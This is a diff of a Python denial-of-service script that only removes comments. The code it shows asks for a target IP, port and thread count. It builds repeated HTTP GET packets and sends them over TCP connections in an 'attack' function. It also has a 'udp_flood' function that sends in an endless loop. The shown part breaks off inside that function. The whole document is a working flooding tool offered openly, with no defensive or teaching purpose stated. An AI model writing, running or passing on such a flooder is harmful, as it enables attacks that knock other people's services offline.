@@ -4,13 +4,12 @@ import random
 import time
 import os
 
-# Configuration
+
 TARGET_IP = input("Enter target IP: ")
 TARGET_PORT = int(input("Enter target port: "))
 THREADS = int(input("Enter number of threads: "))
 PACKET_SIZE = 1024
 
-# Packet crafting
 def craft_packet():
     packet = b"GET / HTTP/1.1\r\n"
     packet += b"Host: " + TARGET_IP.encode() + b"\r\n"
@@ -19,7 +18,7 @@ def craft_packet():
     packet += b"\r\n"
     return packet * (PACKET_SIZE // len(packet))
 
-# Attack function
+
 def attack():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((TARGET_IP, TARGET_PORT))
@@ -30,7 +29,6 @@ def attack():
         except socket.error:
             break
 
-# UDP Flood function
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
